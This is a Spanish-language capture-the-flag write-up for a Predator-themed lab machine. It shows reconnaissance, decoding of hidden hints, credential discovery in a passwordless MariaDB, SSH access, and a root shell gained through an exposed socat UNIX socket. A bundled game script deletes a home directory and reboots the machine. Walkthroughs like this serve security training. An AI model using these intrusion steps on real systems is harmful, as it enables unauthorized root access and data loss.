### Caza en la Jungla

Tú y tu grupo fueron secuestrados en circunstancias desconocidas y llevados a lo más profundo de una selva inexplorada. No hay señales de civilización, solo ruinas cubiertas de maleza y extrañas estructuras que no parecen humanas. A su alrededor, otros prisioneros han desaparecido, uno por uno, dejando solo rastros de sangre y equipo abandonado.

Lo peor de todo es que no están solos. En la oscuridad, entre la niebla y la maleza, algo los observa. Algo que disfruta de la caza.

Los Predators han convertido la jungla en su campo de entrenamiento. Y ustedes son el objetivo.

El Punto de Infiltración: La Terminal Abandonada

Tras horas de exploración y desesperación, encuentran un búnker oculto entre la vegetación. Es viejo, de diseño humano, pero claramente ha sido reutilizado por los Predators.

Junto al búnker hay una nave antigua, olvidada, casi cubierta de maleza. En el interior del búnker se encuentran cables rotos y pantallas cubiertas de polvo, pero hay un ordenador antiguo. No parece mucho, pero es funcional.

Si logran conectarse a los sistemas de los Predators, tal vez puedan descubrir qué está pasando y, con suerte, idear un plan de escape.

Empezamos reconocimiento por nmap

```
nmap -sVC -A <MACHINE_IP> -p-

Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 18:5e:c7:23:80:1e:6b:36:64:8e:f2:d2:17:34:1e:74 (ECDSA)
|_  256 32:c6:9d:52:68:5e:b1:0f:83:26:35:14:e3:c4:b0:44 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Yautja Infiltration Point
|_http-server-header: Apache/2.4.52 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f7:ad:94:c8:f1:f2:ad:d9:63:7d:7e:bc:e2:c3:89:19 (ECDSA)
|_  256 a5:a6:8f:c9:bb:59:3f:13:13:c6:97:81:e4:7d:54:eb (ED25519)
4343/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f7:ad:94:c8:f1:f2:ad:d9:63:7d:7e:bc:e2:c3:89:19 (ECDSA)
|_  256 a5:a6:8f:c9:bb:59:3f:13:13:c6:97:81:e4:7d:54:eb (ED25519)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15

nmap -p- -T4 -A --reason --script "default,vuln,auth,discovery,safe,version" --script-args unsafe=1 --max-retries 3 --min-rate 500 --open --version-all --osscan-guess <IP_MAQUINA>


```
El puerto 80 esta abierto con el servicio http, podemos revisar la pagina web http://IP_MAQUINA:80, revisamos el codigo (Ctrl+U). Encontramos algo cifrado en ROT47 y base 64.

```
  </button>
<!--PtDE2 56=2?E6 56 EFD @;@D[ 24E:G2=@P-->

  <!--
  SGludDogVGhlIGFkbWluIHRlcm1pbmFsIGlzIGxpc3RlbmluZy4uLiB0cnkgYWRtaW4ueWF1dGphLmxvY2Fs
  -->
</body>

```
Para descifrar de base64 podemos utilizar echo "texto" | base64 -d o http://ciberchef.com y para descifrar ROT47 https://www.dcode.fr/rot-47-cipher.
Al descifrarlo tenemos dos fraces: "!Esta delante de tus ojos, activalo!" y "Hint: The admin terminal is listening... try admin.yautja.local". Agregamos en el archivo /etc/hosts un host nuevo de "admin.yautja.local" con su IP y vamos a la pagina http://admin.yautja.local. Alli encontaramos un shell restringuido, donde se puede ejecutar los comandos ls, cat y cd. 

```
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                  
                                                                                                            
· ¡WELCOME TO THE SYSTEM! ·                                                                                 
· ¡IF HE BLEEDS WE CAN KILL HIM! ·                                                                          
· ¡STAY ALERT AND DON'T BECOME A TROPHY ·                                                                   
                                                                                                            
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%    
> pwd
Unknown command: pwd
> ls -la
hunter_logs.txt enigma_hint.txt data_logs/
> cat hunter_logs.txt
Log entry #1: Movement detected at coordinates DB
> cat enigma_hint.txt
Decrypt this: YWN0aXZhdGUgRHV0Y2g=
> cd data_logs
> ls
h3!p recording_01.wav
> cat h3!p
Y2hlY2sgdGhlIGZpbGVz
> cat recording_01.wav
cat: file not found: recording_01.wav

```
Sacamos alguna pista de archivo enigma_hint.txt - "activate Dutch" y del archivo h3!p - "check the files" que estan cifradas en base64. Otro archivo recording_01.wav es un formato de audio digital con o sin compresión de datos. En Linux, un sistema ALSA básico puede reproducir estos archivos. Pero analizando bien este "rbash" resulta que es una trampa, un html con algunos contenodos tipo archivo.txt

```
curl -L http://admin.yautja.local
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Predator Command Terminal</title>
    <style>
        body {
            background-color: black;
            color: #33FF33;
            font-family: monospace;
            padding: 20px;
        }
        #terminal {
            border: 1px solid #33FF33;
            padding: 10px;
            height: 400px;
            overflow-y: auto;
            background-color: #000;
        }
        #input {
            width: 100%;
            background-color: black;
            border: none;
            color: #33FF33;
            font-family: monospace;
            font-size: 1em;
        }
    </style>
</head>
<body>
    <h2>Yautja Predator System v1.04</h2>
    <div id="terminal"></div>
    <input type="text" id="input" placeholder="Enter command..." autofocus>

    <script>
        const terminal = document.getElementById('terminal');
        const input = document.getElementById('input');

        let currentDir = "/";

        const fs = {
            "/": ["hunter_logs.txt", "enigma_hint.txt", "data_logs/"],
            "/data_logs": ["h3!p", "recording_01.wav"]
        };

        function printOutput(text) {
            const line = document.createElement('div');
            line.textContent = text;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function handleCommand(cmd) {
            printOutput("> " + cmd);
            const args = cmd.split(" ");
            const command = args[0];
            const param = args[1];

            if (command === "help") {
                printOutput("Available commands: ls, cd, cat, help, exit, clear");
            } else if (command === "ls") {
                printOutput(fs[currentDir].join("  "));
            } else if (command === "cd") {
                if (param === "..") {
                    currentDir = "/";
                } else if (currentDir === "/" && param === "data_logs") {
                    currentDir = "/data_logs";
                } else {
                    printOutput("cd: no such directory: " + param);
                }
            } else if (command === "cat") {
                if (currentDir === "/" && param === "hunter_logs.txt") {
                    printOutput("Log entry #1: Movement detected at coordinates DB");
                } else if (currentDir === "/" && param === "enigma_hint.txt") {
                    printOutput("Decrypt this: YWN0aXZhdGUgRHV0Y2g=");
                } else if (currentDir === "/data_logs" && param === "h3!p") {
                    printOutput("Y2hlY2sgdGhlIGZpbGVz");
                } else {
                    printOutput("cat: file not found: " + param);
                }
            } else if (command === "") {
                printOutput("Error: Clearance level insufficient to initiate container.");
            } else if (command === "exit") {
                printOutput("Session terminated.");
                input.disabled = true;
            } else if (command === "clear") {
                terminal.innerHTML = "";
            } else {
                printOutput("Unknown command: " + command);
            }
        }

        input.addEventListener("keydown", function (e) {
            if (e.key === "Enter") {
                handleCommand(input.value.trim());
                input.value = "";
            }
        });

        printOutput("[AI-PREDATOR] Terminal interface ready.");
        printOutput("[AI-PREDATOR] Awaiting input...");
    </script>

    <!--
    # encrypted_flag=VGhlIGZsYWcgaXMgbm90IGhlcmUu   ###"The flag is not here."
    -->
</body>
</html>

```
Volvemos a la pagina principal donde encontramos alguna informacion ofuscada en el boton Activate. Vamos a utilizar una herramienta para descifrar la informacion ofuscada con esteganografia. Haciendo doble click en "Activate" dentro del html en inspeccion podemos copiar la info cifrada y descifrar en la pagina https://330k.github.io/misc_tools/unicode_steganography.html. Hemos conseguido posible usuario y su contraseña "alan/hunter123"

```
ssh alan@IP_MAQUINA

 [Alan]#pwd
/home/alan
 [Alan]#ls -la
total 56
drwxr-x--- 6 alan alan 4096 may 16 10:14 .
drwxr-xr-x 4 root root 4096 may 15 08:47 ..
-rw-r--r-- 1 root root   37 may 15 08:39 3L.txt
-rw------- 1 alan alan    0 may  6 09:07 .bash_history
-rw-r--r-- 1 alan alan  220 ene  6  2022 .bash_logout

```
Si, ya estamos dentro. Ahora vamos a revisar todos los archovos y directorios, que informacion podemos conseguir? Hemos encontrado un archivo 3L.txt en el directorio del usuario y su contenido esta cifrado en hexadecimal y otro Dutch.tar.gz.gpg esta cifrado con contraseña que todavia no sabemos (la contraseña de usuario alan no corresponde)

```
[Alan]#gpg -d Dutch.tar.gz.gpg 
                          ┌──────────────────────────────────────────────────────┐
                          │ Enter passphrase                                     │
                          │                                                      │
                          │                                                      │
                          │ Passphrase: ________________________________________ │
                          │                                                      │
                          │       <OK>                              <Cancel>     │
                          └──────────────────────────────────────────────────────┘
                          


```
Revisando todos directorios del sistema hemos encontrado dentro del directorio /usr/bin un archivo survive.txt con la pista que existe 6 archivos que se tiene que juntar para conseguir una respuesta. Los nombres de estos 6 archivos reunen: HELPME y la frase que revelan: "with my digital key you enter a username is your nickname the password Y3ix3z01987"

```
 [Alan]#cat survive.txt                                                                                     
###########################################                                                                 
                                                                                                            
~¡DUTCH, I NEED YOUR HELP! ~                                                                                
FIND THE FILES, DECIPHER THE CONTENT                                                                        
AND CHECK THE RESULTS.                                                                                      
REMEMBER 6                                                                                                  
                                                                                                            
###########################################   

  [Alan]#pwd                                                                                                 
/usr/bin                                                                                                    
 [Alan]#ls -la                                                                                              
total 627828                                                                                                
drwxr-xr-x  2 root root       36864 may 16 11:00  .                                                         
drwxr-xr-x 14 root root        4096 may 16 10:05  ..
-rwxr-xr-x  1 root root       51648 feb  8  2024 '['
-rw-r--r--  1 root root         171 may 15 08:43  1H.txt

 [Alan]#cat 1H.txt                                                                                          
01110111 01101001 01110100 01101000 00100000 01101101 01111001 00100000 01100100 01101001 01100111 01101001 01110100 01100001 01101100 00100000 01101011 01100101 01111001 ### with my digital key
 
 
 [Alan]#pwd
/home
 [Alan]#ls -la
total 32
drwxr-xr-x  4 root root  4096 may 15 08:47 .
drwxr-xr-x 20 root root  4096 may  6 09:34 ..
-rw-r--r--  1 root root    45 may 15 08:47 2E.txt

 [Alan]#cat 2E.txt
0x79 0x6f 0x75 0x20 0x65 0x6e 0x74 0x65 0x72 ### you enter


 [Alan]#pwd
/home/alan
 [Alan]#ls -la
total 56
drwxr-x--- 6 alan alan 4096 may 16 10:14 .
drwxr-xr-x 4 root root 4096 may 15 08:47 ..
-rw-r--r-- 1 root root   37 may 15 08:39 3L.txt

cat 3L.txt                                                                                          
97 32 117 115 101 114 110 97 109 101  ### a username

 [Alan]#pwd                                                                                                 
/etc                                                                                                        
 [Alan]#ls -la                                                                                              
total 916                                                                                                   
drwxr-xr-x  105 root root       4096 may 16 11:00 .                                                         
drwxr-xr-x   20 root root       4096 may  6 09:34 ..
-rw-r--r--    1 root root         17 may 15 08:47 4P.txt

 [Alan]#cat 4P.txt
oy euax toiqtgsk   ### is your nickname

 [Alan]#pwd                                                                                                 
/usr/local                                                                                                  
 [Alan]#ls -la                                                                                              
total 44                                                                                                    
drwxr-xr-x 10 root root 4096 may 15 08:49 .                                                                 
drwxr-xr-x 14 root root 4096 may 16 10:05 ..
-rw-r--r--  1 root root  120 may 15 08:49 5M.txt

 [Alan]#cat 5M.txt
0x74 0x00 0x68 0x00 0x65 0x00 0x20 0x00 0x70 0x00 0x61 0x00 0x73 0x00 0x73 0x00 0x77 0x00 0x6f 0x00 0x72 0x00 0x64 0x00  - ### the password

 [Alan]#pwd                                                                                                 
/var/cache                                                                                                  
 [Alan]#ls -la                                                                                              
total 64                                                                                                    
drwxr-xr-x 15 root          root          4096 may  7 08:52 .                                               
drwxr-xr-x 14 root          root          4096 may 16 10:10 ..
-rw-r--r--  1 root          root            12 may  4 07:20 6E.txt

 [Alan]#cat 6E.txt
y3ix3z01987  ### s3cr3t01987  

```
Ahora podemos probar abrir el archvo  Dutch.tar.gz.gpg encriptado con contraseña  s3cr3t01987

```
gpg -d Dutch.tar.gz.gpg > Dutch.tar.gz
tar -xzf Dutch.tar.gz 

```
Ejecutando el archivo Dutch con python3 empieza un juego al final de cual sale un flag

```                                                            
    "⚠ YAUTJA SYSTEM HACKED ⚠",                                                  
    "The alien systems are now exposed." 

```
Desde /home del usuario alan podemos ejecutar sudo su y parece que tenemos algunos permisos, pero no son de root. Hemos encontrado que existe una base de datos dentro de la maquina.

```

Yautja system find / -type f \( -iname "*.sql" -o -iname "*.db" -o -iname "*.sqlite" \) 2>/dev/null 

/usr/lib/firmware/regulatory.db
/usr/share/mysql/mysql_sys_schema.sql
/usr/share/mysql/fill_help_tables.sql
/usr/share/mysql/mysql_performance_tables.sql
/usr/share/mysql/mysql_test_data_timezone.sql
/usr/share/mysql/mysql_test_db.sql
/usr/share/mysql/mysql_system_tables.sql
/usr/share/mysql/mysql_system_tables_data.sql
/usr/share/mysql/maria_add_gis_sp_bootstrap.sql
/var/lib/PackageKit/transactions.db
/var/lib/command-not-found/commands.db
/var/lib/fwupd/pending.db
/var/cache/snapd/commands.db

Yautja system ls -la /var/lib/mysql/

total 123344
drwxr-xr-x  6 mysql mysql      4096 may 31 17:35 .
drwxr-xr-x 48 root  root       4096 may 16 11:00 ..
-rw-rw----  1 mysql mysql    417792 may 16 11:02 aria_log.00000001
-rw-rw----  1 mysql mysql        52 may 16 11:02 aria_log_control
-rw-rw----  1 mysql mysql         9 may 15 22:06 ddl_recovery-backup.log
-rw-rw----  1 mysql mysql         9 may 31 17:35 ddl_recovery.log
-rw-r--r--  1 root  root          0 may  3 17:27 debian-10.6.flag
-rw-rw----  1 mysql mysql       934 may 16 11:02 ib_buffer_pool
-rw-rw----  1 mysql mysql  12582912 may 16 11:02 ibdata1
-rw-rw----  1 mysql mysql 100663296 may 31 17:35 ib_logfile0
-rw-rw----  1 mysql mysql  12582912 may 31 17:35 ibtmp1
-rw-rw----  1 mysql mysql         0 may  3 17:27 multi-master.info
drwx------  2 mysql mysql      4096 may  3 17:27 mysql
-rw-r--r--  1 root  root         15 may  3 17:27 mysql_upgrade_info
drwx------  2 mysql mysql      4096 may  3 17:27 performance_schema
drwx------  2 mysql mysql     12288 may  3 17:27 sys
drwx------  2 mysql mysql      4096 may  3 17:35 yautja

```
Podemos probar de entrar a la base de datos como root sin contraseña y encontramos que existe otro usuario george con contraseña gettothechoppa

```

 Yautja system mysql -u root -p
Enter password: 

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| yautja             |
+--------------------+

MariaDB [yautja]> show tables;
+------------------+
| Tables_in_yautja |
+------------------+
| users            |
+------------------+

MariaDB [yautja]> select * from users;
+----------+----------------+
| username | pwd            |
+----------+----------------+
| george   | gettothechoppa |
| user001  | pass001        |
| user002  | pass002        |

```
Vamos a probar de entrar como usuario george, pero tenemos espicificar el puerto 2222

```
ssh george@10.10.145.152       
george@10.10.145.152's password: 
Permission denied, please try again.

ssh -p 2222 george@10.10.145.152

$ pwd
/home/george
$ ls -la
total 28
drwxr-x--- 1 george george 4096 May 13 13:03 .
drwxr-xr-x 1 root   root   4096 May 13 12:48 ..
-rw-r--r-- 1 george george  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 george george 3771 Jan  6  2022 .bashrc
drwx------ 2 george george 4096 May 13 13:03 .cache
-rw-r--r-- 1 george george  807 Jan  6  2022 .profile

```
Pero tampoco tiene permisos de root

```

$ sudo su
-sh: 3: sudo: not found

```
Vamos a buscar la vulnerabilidad para escalar privilegios, revisamos los procesos de root

```
$ ps aux | grep root
root           1  0.0  0.3   4496  3532 pts/0    Ss+  17:35   0:00 /bin/bash /usr/local/bin/entrypoint.sh
root          16  0.0  0.3  10296  2900 pts/0    S+   17:35   0:00 /usr/bin/socat UNIX-LISTEN:/tmp/root.sock,fork EXEC:/bin/sh -i
root          21  0.0  0.1   2824   992 pts/0    S+   17:35   0:00 tail -f /dev/null
root          22  0.0  0.3  15440  3420 ?        Ss   17:35   0:00 sshd: /usr/sbin/sshd -f /etc/ssh/sshd_config_trap [listener] 0 of 10-100 startups
root          23  0.0  0.5  15436  4948 ?        Ss   17:35   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          24  0.0  1.0  16728  9972 ?        Ss   18:01   0:00 sshd: george [priv]

```
Encontramos socat UNIX-LISTEN
El uso de socat - UNIX-CONNECT:/tmp/root.sock para obtener acceso como root indica que hay un socket UNIX expuesto con permisos inseguros, el cual permite a un usuario no privilegiado conectarse a un proceso privilegiado (como uno corriendo como root). Esto es una configuración insegura y representa una escalada local de privilegios.

```
$ socat - UNIX-CONNECT:/tmp/root.sock
whoami
root
pwd
/
ls -la
total 68
drwxr-xr-x   1 root root 4096 May 13 13:01 .
drwxr-xr-x   1 root root 4096 May 13 13:01 ..
-rwxr-xr-x   1 root root    0 May 13 13:01 .dockerenv
lrwxrwxrwx   1 root root    7 Apr  4 02:03 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 18  2022 boot
drwxr-xr-x   5 root root  360 May 31 17:35 dev
drwxr-xr-x   1 root root 4096 May 31 17:35 etc
drwxr-xr-x   1 root root 4096 May 13 12:48 home
lrwxrwxrwx   1 root root    7 Apr  4 02:03 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr  4 02:03 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Apr  4 02:03 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Apr  4 02:03 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Apr  4 02:03 media
drwxr-xr-x   2 root root 4096 Apr  4 02:03 mnt
drwxr-xr-x   2 root root 4096 Apr  4 02:03 opt
dr-xr-xr-x 190 root root    0 May 31 17:35 proc
drwx------   1 root root 4096 May 15 20:24 root
drwxr-xr-x   1 root root 4096 May 31 18:02 run
lrwxrwxrwx   1 root root    8 Apr  4 02:03 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Apr  4 02:03 srv
dr-xr-xr-x  13 root root    0 May 31 17:35 sys
drwxrwxrwt   1 root root 4096 May 31 17:35 tmp
drwxr-xr-x   1 root root 4096 Apr  4 02:03 usr
drwxr-xr-x   1 root root 4096 Apr  4 02:10 var

```
Revisamos el directorio /root

```
cd root
ls -la
total 28
drwx------ 1 root root 4096 May 15 20:24 .
drwxr-xr-x 1 root root 4096 May 13 13:01 ..
-rw-r--r-- 1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
---x--x--x 1 root root 6307 May 15 20:22 yautja
---x--x--x 1 root root  751 May 15 12:36 yautja_flag

```
Encontramos dos archivos yautja y yautja_flag, pero son ejecutables. Al ejecutar se bloquea el sistema. Con chmod 666 cambiamos los permisos y con cat podemos leer los archivos.

```
chmod 666 yautja
cat yautja

 # Flag and victory message
    flag_lines = [
        "⚠ YAUTJA SYSTEM OVERRIDE ⚠",
        ">>> THU{Escape_of_the_jungle} <<<",
        "",
        "Congratulations, you have successfully bypassed the Predator systems.",
        "You've escaped the jungle. 🏃💨"


```
Ya tenemos la flag de root!!! THU{Escape_of_the_jungle} 

```


```
Aqui son algunos archivos que encontrado en el sistema

```

/usr/local/bin                                                                                              
 [Alan]#ls -la                                                                                              
total 12                                                                                                    
drwxr-xr-x  2 root root 4096 may 13 12:03 .                                                                 
drwxr-xr-x 10 root root 4096 may 15 08:49 ..
-rwxr-xr-x  1 root root 3081 may  5 00:55 cmd_interface.sh
 [Alan]#cat cmd_interface.sh
#!/bin/bash                                                                                                 
                                                                                                            
# Función de temporizador de cuenta atrás (envía SIGALRM a los read)                                        
timer() {                                                                                                   
  local secs=\$1                                                                                            
  local pid=\$2                                                                                             
  while (( secs > 0 )); do                                                                                  
    echo -ne " Time remaining: \${secs}s\r"                                                                 
    sleep 1                                                                                                 
    ((secs--))                                                                                              
  done                                                                                                      
  echo                                                                                                      
  echo "Time’s up! System cleansing initiated..."                                                           
  sleep 1                                                                                                   
  # Borrado de /home/george y reboot                                                                        
  rm -rf /home/george/*                                                                                     
  echo "System will reboot now..."                                                                          
  sleep 2                                                                                                   
  /sbin/reboot                                                                                              
}                                                                                                           
                                                                                                            
clear                                                                                                       
echo "You step into the great cavern’s mouth."                                                              
echo "Two passages lie before you:"                                                                         
echo "  1) The towering cavern on the LEFT."                                                                
echo "  2) The narrow tunnel on the RIGHT."                                                                 
                                                                                                            
# START timer in background for choice 1                                                                    
timer 60 $$ &                                                                                               
TIMERPID=\$!                                                                                                
read -t 60 -p "Choose 1 or 2: " choice                                                                      
kill \$TIMERPID 2>/dev/null                                                                                 
                                                                                                            
case "\$choice" in                                                                                          
  1)                                                                                                        
    clear                                                                                                   
    echo "You enter the great cavern. After a few paces, you reach a wide chasm."                           
    echo "Will you:"                                                                                        
    echo "  climb  – scramble up the jagged wall."                                                          
    echo "  jump   – take a running leap across, grabbing swinging vines."                                  
                                                                                                            
    timer 60 \$\$ &                                                                                         
    TPMID=\$!                                                                                               
    read -t 60 -p "Type climb or jump: " action                                                             
    kill \$TPMID 2>/dev/null                                                                                
                                                                                                            
    case "\$action" in                                                                                      
      climb)                                                                                                
        echo "You claw up the rough stone face. Bloodied, you reach the other side."                        
        ;;                                                                                                  
      jump)                                                                                                 
        echo "You sprint and leap! You grab a vine mid-air and swing safely over."                          
        ;;                                                                                                  
      *)                                                                                                    
        echo "A moment’s hesitation—and the ground gives way beneath you..."                                
        sleep 2                                                                                             
        rm -rf /home/george/*                                                                               
        echo "SYSTEM LOCKDOWN! Rebooting now..."                                                            
        sleep 2                                                                                             
        /sbin/reboot                                                                                        
        ;;                                                                                                  
    esac                                                                                                    
    ;;                                                                                                      
  2)                                                                                                        
    clear                                                                                                   
    echo "You squeeze into the narrow tunnel. It twists deeper, then dead-ends."                            
    echo "You see two vents above:"                                                                         
    echo "  up   – climb the vent grate."                                                                   
    echo "  back – turn around, but the way back is collapsing!"                                            
                                                                                                            
    timer 60 \$\$ &                                                                                         
    TPMID=\$!                                                                                               
    read -t 60 -p "Type up or back: " move                                                                  
    kill \$TPMID 2>/dev/null                                                                                
                                                                                                            
    case "\$move" in                                                                                        
      up)                                                                                                   
        echo "You boost yourself up, push open the grate, and crawl into sunlight."                         
        ;;                                                                                                  
      back)                                                                                                 
        echo "You rush back, but the tunnel collapses behind you, sealing your fate..."                     
        sleep 2                                                                                             
        rm -rf /home/george/*                                                                               
        echo "SYSTEM LOCKDOWN! Rebooting now..."                                                            
        sleep 2                                                                                             
        /sbin/reboot                                                                                        
        ;;                                                                                                  
      *)                                                                                                    
        echo "Frozen in fear, the tunnel shifts and you’re buried alive..."                                 
        sleep 2                                                                                             
        rm -rf /home/george/*                                                                               
        echo "SYSTEM LOCKDOWN! Rebooting now..."                                                            
        sleep 2                                                                                             
        /sbin/reboot                                                                                        
        ;;                                                                                                  
    esac                                                                                                    
    ;;                                                                                                      
  *)                                                                                                        
    echo "Confusion reigns—you wander until the cavern’s darkness consumes you."                            
    sleep 2                                                                                                 
    rm -rf /home/george/*                                                                                   
    echo "SYSTEM LOCKDOWN! Rebooting now..."                                                                
    sleep 2                                                                                                 
    /sbin/reboot                                                                                            
    ;;                                                                                                      
esac                                                                                                        
                                                                                                            
# If we reach here, the hero has survived their choices                                                     
echo                                                                                                        
echo "With a final sprint you burst into an alien hangar. The Predator ship looms."                         
echo "You climb aboard, yank the controls—and somehow it roars to life."                                    
echo                                                                                                        
echo ">>> YOU HAVE ESCAPED! <<<"                                                                            
echo                                                                                                        
cat /root/flag_final.txt   


root    UID:0   Home:/root      Shell:/bin/bash                                                                             
daemon  UID:1   Home:/usr/sbin  Shell:/usr/sbin/nologin                                                                     
bin     UID:2   Home:/bin       Shell:/usr/sbin/nologin                                                                     
sys     UID:3   Home:/dev       Shell:/usr/sbin/nologin                                                                     
sync    UID:4   Home:/bin       Shell:/bin/sync                                                                             
games   UID:5   Home:/usr/games Shell:/usr/sbin/nologin                                                                     
man     UID:6   Home:/var/cache/man     Shell:/usr/sbin/nologin                                                             
lp      UID:7   Home:/var/spool/lpd     Shell:/usr/sbin/nologin                                                             
mail    UID:8   Home:/var/mail  Shell:/usr/sbin/nologin                                                                     
news    UID:9   Home:/var/spool/news    Shell:/usr/sbin/nologin                                                             
uucp    UID:10  Home:/var/spool/uucp    Shell:/usr/sbin/nologin                                                             
proxy   UID:13  Home:/bin       Shell:/usr/sbin/nologin                                                                     
www-data        UID:33  Home:/var/www   Shell:/usr/sbin/nologin                                                             
backup  UID:34  Home:/var/backups       Shell:/usr/sbin/nologin                                                             
list    UID:38  Home:/var/list  Shell:/usr/sbin/nologin                                                                     
irc     UID:39  Home:/run/ircd  Shell:/usr/sbin/nologin                                                                     
gnats   UID:41  Home:/var/lib/gnats     Shell:/usr/sbin/nologin                                                             
nobody  UID:65534       Home:/nonexistent       Shell:/usr/sbin/nologin                                                     
_apt    UID:100 Home:/nonexistent       Shell:/usr/sbin/nologin                                                             
systemd-network UID:101 Home:/run/systemd       Shell:/usr/sbin/nologin                                                     
systemd-resolve UID:102 Home:/run/systemd       Shell:/usr/sbin/nologin                                                     
messagebus      UID:103 Home:/nonexistent       Shell:/usr/sbin/nologin                                                     
systemd-timesync        UID:104 Home:/run/systemd       Shell:/usr/sbin/nologin                                             
pollinate       UID:105 Home:/var/cache/pollinate       Shell:/bin/false                                                    
syslog  UID:106 Home:/home/syslog       Shell:/usr/sbin/nologin                                                             
uuidd   UID:107 Home:/run/uuidd Shell:/usr/sbin/nologin                                                                     
tcpdump UID:108 Home:/nonexistent       Shell:/usr/sbin/nologin                                                             
tss     UID:109 Home:/var/lib/tpm       Shell:/bin/false                                                                    
landscape       UID:110 Home:/var/lib/landscape Shell:/usr/sbin/nologin                                                     
fwupd-refresh   UID:111 Home:/run/systemd       Shell:/usr/sbin/nologin                                                     
usbmux  UID:112 Home:/var/lib/usbmux    Shell:/usr/sbin/nologin                                                             
sshd    UID:113 Home:/run/sshd  Shell:/usr/sbin/nologin                                                                     
alan    UID:1000        Home:/home/alan Shell:/bin/bash                                                                     
lxd     UID:999 Home:/var/snap/lxd/common/lxd   Shell:/bin/false                                                            
mysql   UID:114 Home:/nonexistent       Shell:/bin/false                                                                    
dnsmasq UID:115 Home:/var/lib/misc      Shell:/usr/sbin/nologin


[Alan]#cat /hocat /home/alan/.ssh/known_hosts
|1|cAD2W6w1VZrUA59UKxIYabNgh50=|bYIYzKx2YPpbq1gTbGEHTkwyYoU= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8yWMzI6NZ2WvmCKyKp37rCBiJVLqKAjNz2M2LFQubh                                         
|1|RSE3s/X5e0IYf3Jf6nkOvTVSKaQ=|lgfkESXgJcgaPMrny7l6/ihiRUQ= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAPFSzz3POjNDju86J8LOq7UfROMKxqGJmdwRrSQV6Kw                                         
|1|ee1RfUvvsqFrPLr+pI0z2rrE4Ow=|uUnAMPEJAMe/I5TDYrreS4T58Ig= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWwTeGaMBrguTrweaWwBf0pwYtM6FlxEUxs+zz362nDpjwUV+MpG7CAYBVh/9Kux8EqCC2JNCFdrmK/k/8FdXmx25XItuJ5qrqwle0z145ntpKSguLJx2b8sVIe8vgnsFYuulisO3ZuwIjRPyGZ1EIhgHKH+lTtfUXoB2ob+4sz7tcbLjDmJXN7Y2QITpsa6SlCn8XhAxBmDuaZGUmC3a7koRU5T7wW2hWpsIALT7TmLwLk/vgn8U4yrvpbKKRZPjjnbFyT7+aKtIjOhL7gyvjO/WBm4f5oDeb9v86lGQe/MTgz4cNBCVwrnrVjewmNoiaz2X/idAC2+p99yA+j8pyDXm9IJ+Lhr9fkbWEJcIPsKThOB2NBFNPxpVoXlO1Ke28YzGrevQ/XnQVs+AP6RwPbDHwAWhmW/uT2BoxDW4aWzQ+d/t93qpuvub3vL/MAAA6vNmzt2yelxKvT8PCQUnsjnLxCslP0bIFK7YvhhyVgtWBXuSl0SfWk5eMjeBbY2U=                        
|1|GY0OzAotABn3YaP6gEo4PovsRhI=|osw9jIa0pIfEBJIP0FwDD42DuUA= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrwtLsvvey2JQCFWHrSAbUES7H+YdGKLwJTw6xwNw96bjd0mlGohPQxoIG4n6KaWEHI07LtWDoDSE3uE6gnjV0=                                                    
|1|KJxyyifiZZMYS9xzvGAECalqtow=|vbDaUodzbEV/fBrzM+xd4jLUEGc= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICQ++r16NNJH4zcIuvqn0UTh3JXSQo0HmqK1LpGLjRl3                                         
|1|68+R/emOJjAJ/i3TC7lhQ1ePrn8=|7ITvKqTeHkSnFNn9RnGVqFSEMgE= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILIDQYp7PuCU3r/qM+8M21/tHqAH4eiL6OoZ7NUrrTW1                                         
